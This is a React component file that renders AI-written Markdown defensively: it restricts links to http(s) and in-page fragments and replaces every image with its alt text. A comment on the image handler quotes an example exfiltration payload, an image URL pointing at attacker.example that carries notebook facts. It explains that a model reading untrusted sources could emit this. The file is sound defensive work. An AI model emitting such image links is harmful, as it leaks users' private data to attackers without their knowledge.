"use client";

import { useMemo, type ComponentPropsWithoutRef } from "react";
import ReactMarkdown, { type Components, type ExtraProps } from "react-markdown";
import remarkGfm from "remark-gfm";

const REMARK_PLUGINS = [remarkGfm];

export function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value);
}

/**
 * A link in model-written Markdown.
 *
 * - http(s) links open in a new tab, without a referrer and without `window.opener`.
 * - `#fragment` links (GFM footnotes) stay in the page.
 * - Anything else is shown as its text, not as a link: relative paths (they would point
 *   into this app) and every other scheme, whatever a URL transform lets through.
 */
export function MarkdownLink({
  href,
  children,
  id,
  className,
  "aria-label": ariaLabel,
  "aria-describedby": ariaDescribedBy,
}: ComponentPropsWithoutRef<"a"> & ExtraProps) {
  if (href?.startsWith("#")) {
    return (
      <a href={href} id={id} className={className} aria-label={ariaLabel} aria-describedby={ariaDescribedBy}>
        {children}
      </a>
    );
  }
  if (href && isHttpUrl(href)) {
    return (
      <a href={href} target="_blank" rel="noreferrer noopener">
        {children}
      </a>
    );
  }
  return <>{children}</>;
}

/**
 * Images are never loaded. The text comes from a model that reads untrusted sources, and
 * `![](https://attacker.example/?d=<notebook facts>)` would send those facts to the
 * attacker as soon as it rendered, with no click. The alt text is shown instead.
 */
function MarkdownImage({ alt }: ComponentPropsWithoutRef<"img"> & ExtraProps) {
  return alt ? <>{alt}</> : null;
}

const BASE_COMPONENTS: Components = { a: MarkdownLink, img: MarkdownImage };

/**
 * The one place model-written Markdown (answers, notebook guides, generated documents)
 * becomes HTML. Raw HTML in the text is not rendered (react-markdown's default), images
 * are replaced by their alt text and links go through `MarkdownLink`.
 *
 * `components` overrides how elements render (pass a stable object, not a new one per
 * render), except `img`, which callers cannot re-enable.
 */
export function Markdown({ children, components }: { children: string; components?: Components }) {
  const merged = useMemo<Components>(
    () => (components ? { ...BASE_COMPONENTS, ...components, img: MarkdownImage } : BASE_COMPONENTS),
    [components],
  );
  return (
    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={merged}>
      {children}
    </ReactMarkdown>
  );
}
